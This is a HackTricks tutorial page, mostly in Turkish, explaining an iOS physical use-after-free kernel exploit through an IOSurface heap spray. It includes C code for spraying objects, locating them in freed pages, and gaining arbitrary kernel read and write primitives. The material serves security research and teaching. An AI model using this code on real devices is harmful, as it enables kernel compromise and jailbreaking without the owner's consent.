# iOS Physical Use After Free via IOSurface

{{#include ../../banners/hacktricks-training.md}}


## Physical use-after-free

Bu, [https://alfiecg.uk/2024/09/24/Kernel-exploit.html](https://alfiecg.uk/2024/09/24/Kernel-exploit.html) adresindeki gönderiden bir özet olup, bu teknikle ilgili daha fazla bilgiye [https://github.com/felix-pb/kfd](https://github.com/felix-pb/kfd) üzerinden ulaşılabilir.

### XNU'de Bellek Yönetimi <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a>

iOS'teki kullanıcı süreçleri için sanal bellek adres uzayı **0x0 ile 0x8000000000** arasındadır. Ancak bu adresler doğrudan fiziksel belleğe eşlenmez. Bunun yerine **kernel**, sanal adresleri gerçek **fiziksel adreslere** çevirmek için **sayfa tabloları** kullanır.

#### iOS'te Sayfa Tablosu Seviyeleri

Sayfa tabloları hiyerarşik olarak üç seviyede düzenlenir:

1. **L1 Page Table (Level 1)**:
* Buradaki her giriş sanal belleğin büyük bir aralığını temsil eder.
* **0x1000000000 bytes** (veya **256 GB**) sanal belleği kapsar.
2. **L2 Page Table (Level 2)**:
* Buradaki bir giriş daha küçük bir sanal bellek bölgesini, spesifik olarak **0x2000000 bytes** (32 MB) temsil eder.
* Bir L1 girişi tüm bölgeyi kendi başına eşleyemiyorsa bir L2 tablosuna işaret edebilir.
3. **L3 Page Table (Level 3)**:
* En ince seviye budur; her giriş tek bir **4 KB** bellek sayfasını haritalar.
* Daha ayrıntılı kontrol gerektiğinde bir L2 girişi L3 tablosuna işaret edebilir.

#### Sanalden Fiziksele Haritalama

* **Direct Mapping (Block Mapping)**:
  * Sayfa tablosundaki bazı girişler sanal adreslerin bir aralığını doğrudan fiziksel adreslerin bitişik bir aralığına eşler (kısayol gibi).
* **Pointer to Child Page Table**:
  * Daha ince kontrol gerekiyorsa, bir seviyedeki bir giriş (ör. L1) bir alt seviye sayfa tablosuna (ör. L2) işaret edebilir.

#### Bir Sanal Adresin Haritalanması Örneği

Diyelim ki **0x1000000000** sanal adresine erişmeye çalıştınız:

1. **L1 Table**:
* Kernel bu sanal adrese karşılık gelen L1 girişini kontrol eder. Eğer bir **L2 page table** işaretçisine sahipse, o L2 tablosuna gider.
2. **L2 Table**:
* Kernel daha ayrıntılı bir eşleme için L2 sayfa tablosunu kontrol eder. Eğer bu giriş bir **L3 page table** işaret ediyorsa, oraya ilerler.
3. **L3 Table**:
* Kernel son L3 girişine bakar; bu giriş gerçek bellek sayfasının **fiziksel adresine** işaret eder.

#### Adres Haritalama Örneği

Eğer L2 tablosunun ilk indeksine fiziksel adres **0x800004000** yazarsanız:

* **0x1000000000** ile **0x1002000000** arasındaki sanal adresler **0x800004000** ile **0x802004000** arasındaki fiziksel adreslere eşlenir.
* Bu, L2 seviyesinde bir **block mapping**'dir.

Alternatif olarak, L2 girişi bir L3 tablosuna işaret ediyorsa:

* **0x1000000000 -> 0x1002000000** sanal adres aralığındaki her 4 KB sayfa, L3 tablosundaki bireysel girişler tarafından haritalanır.

### Physical use-after-free

Bir **physical use-after-free (UAF)** şu durumda oluşur:

1. Bir süreç belleği **okunabilir ve yazılabilir** olarak **ayırır**.
2. Bu belleği sürecin erişebileceği belirli bir fiziksel adrese eşlemek için **sayfa tabloları** güncellenir.
3. Süreç belleği **serbest bırakır (free)**.
4. Ancak bir **bug** nedeniyle kernel, ilgili fiziksel belleği serbest olarak işaretlese bile sayfa tablolarından bu **eşlemeyi kaldırmayı unutur**.
5. Kernel daha sonra bu "serbest" fiziksel belleği başka amaçlarla, örneğin **kernel verisi** için **yeniden ayırabilir**.
6. Eşleme kaldırılmadığı için süreç yine de bu fiziksel belleği **okuyup yazabilir**.

Bu, sürecin içinde bulunduğu sayfalar vasıtasıyla **kernel belleğine** erişebileceği anlamına gelir; bu bellek hassas veri veya yapılar içerebilir ve saldırganın **kernel belleğini manipüle etmesine** olanak sağlayabilir.

### IOSurface Heap Spray

Saldırganın hangi spesifik kernel sayfalarının serbest belleğe atanacağını kontrol edememesi nedeniyle, bir teknik olan **heap spray** kullanılır:

1. Saldırgan kernel belleğinde çok sayıda **IOSurface** nesnesi oluşturur.
2. Her IOSurface nesnesi alanlarından birinde bir **magic value** içerir, bu da onları tanımlamayı kolaylaştırır.
3. Serbest bırakılan sayfaları tarayarak bu IOSurface nesnelerinden herhangi birinin serbest bir sayfaya yerleşip yerleşmediğine bakarlar.
4. Bir serbest sayfada bir IOSurface nesnesi bulduklarında, bunu kullanarak **kernel belleğini okuyup yazabilirler**.

Bu konu hakkında daha fazla bilgi için bakınız: [https://github.com/felix-pb/kfd/tree/main/writeups](https://github.com/felix-pb/kfd/tree/main/writeups)

> [!TIP]
> iOS 16+ (A12+) cihazların donanımsal hafifletmeleri (PPL veya SPTM gibi) physical UAF tekniklerini büyük ölçüde daha az uygulanabilir hale getirdiğini unutmayın.
> PPL, code signing, entitlements ve hassas kernel verileriyle ilişkili sayfalara sıkı MMU korumaları uygular; bu yüzden bir sayfa yeniden kullanılsa bile userland veya ele geçirilmiş kernel kodundan PPL-korumalı sayfalara yapılan yazmalar engellenir.
> Secure Page Table Monitor (SPTM) PPL'yi sayfa tablosu güncellemelerini sertleştirerek genişletir. Bu, ayrıcalıklı kernel kodunun bile serbest bırakılmış sayfaları sessizce yeniden eşlememesini veya eşlemelerle oynamamasını sağlamak için güvenli kontroller gerektirir.
> KTRR (Kernel Text Read-Only Region), kernel'in kod bölümünü boot sonrası salt okunur hale kilitler. Bu, runtime'da kernel kodunun değiştirilmesini engelleyerek physical UAF exploitlerinin sıklıkla dayandığı büyük bir saldırı vektörünü kapatır.
> Ayrıca, `IOSurface` tahsisleri daha az öngörülebilir ve user-accessible bölgelere eşlemek daha zor hale geldi; bu da "magic value tarama" numarasını çok daha güvensiz kılar. Ve `IOSurface` artık entitlements ve sandbox kısıtlamaları ile korunur.

### Step-by-Step Heap Spray Process

1. **Spray IOSurface Objects**: Saldırgan özel bir tanımlayıcı ("magic value") ile çok sayıda IOSurface nesnesi oluşturur.
2. **Scan Freed Pages**: Nesnelerden herhangi birinin serbest bir sayfaya atanıp atanmadığını kontrol ederler.
3. **Read/Write Kernel Memory**: IOSurface nesnesindeki alanları manipüle ederek kernel belleğinde **keyfi okuma ve yazma** yeteneği kazanırlar. Bu onlara şunları sağlar:
* Bir alanı kullanarak kernel belleğindeki herhangi bir 32-bit değeri **okuyabilme**.
* Başka bir alanı kullanarak 64-bit değerleri **yazabilme**, böylece kararlı bir **kernel read/write primitive** elde etme.

Generate IOSurface objects with the magic value IOSURFACE\_MAGIC to later search for:
```c
void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients >= 0x4000) return;
for (int i = 0; i < nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &args, 0x20, 0, 0, &result, &size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
```
Bir serbest bırakılmış fiziksel sayfadaki **`IOSurface`** nesnelerini ara:
```c
int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i < 0x400; i++) {
spray_iosurface(client, 10, &surfaceIDs, &nSurfaceIDs);

for (int j = 0; j < nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k < stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i < nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
```
### IOSurface ile Kernel Read/Write Elde Etme

Kullanıcı alanından erişilebilen serbest bırakılmış bir fiziksel sayfaya eşlenmiş kernel belleğindeki bir IOSurface nesnesi üzerinde kontrol elde ettikten sonra, bunu **arbitrary kernel read and write operations** için kullanabiliriz.

**Key Fields in IOSurface**

IOSurface nesnesinin iki kritik alanı vardır:

1. **Use Count Pointer**: Allows a **32-bit read**.
2. **Indexed Timestamp Pointer**: Allows a **64-bit write**.

Bu işaretçileri overwrite ederek, bunları kernel belleğindeki arbitrary adreslere yönlendirir ve read/write yeteneklerini mümkün kılabiliriz.

#### 32-Bit Kernel Read

Okuma gerçekleştirmek için:

1. **use count pointer**'ı hedef adres eksi 0x14 bayt offsetine işaret edecek şekilde overwrite edin.
2. `get_use_count` methodunu kullanarak o adresteki değeri okuyun.
```c
uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &out, &size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
```
#### 64-Bit Çekirdek Yazma

Yazma işlemini gerçekleştirmek için:

1. Hedef adrese **indekslenmiş zaman damgası işaretçisini** yeniden yazın.
2. 64-bit bir değer yazmak için `set_indexed_timestamp` metodunu kullanın.
```c
void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
```
#### Exploit Flow Recap

1. **Trigger Physical Use-After-Free**: Serbest bırakılmış sayfalar yeniden kullanım için mevcuttur.
2. **Spray IOSurface Objects**: Çekirdek belleğinde benzersiz bir "magic value" içeren çok sayıda IOSurface nesnesi tahsis edin.
3. **Identify Accessible IOSurface**: Kontrolünüzdeki serbest bırakılmış bir sayfada bulunan bir IOSurface'i tespit edin.
4. **Abuse Use-After-Free**: IOSurface yöntemleri aracılığıyla rastgele **kernel read/write** sağlamak için IOSurface nesnesindeki işaretçileri değiştirin.

With these primitives, the exploit provides controlled **32-bit reads** and **64-bit writes** to kernel memory. Further jailbreak steps could involve more stable read/write primitives, which may require bypassing additional protections (e.g., PPL on newer arm64e devices).

{{#include ../../banners/hacktricks-training.md}}
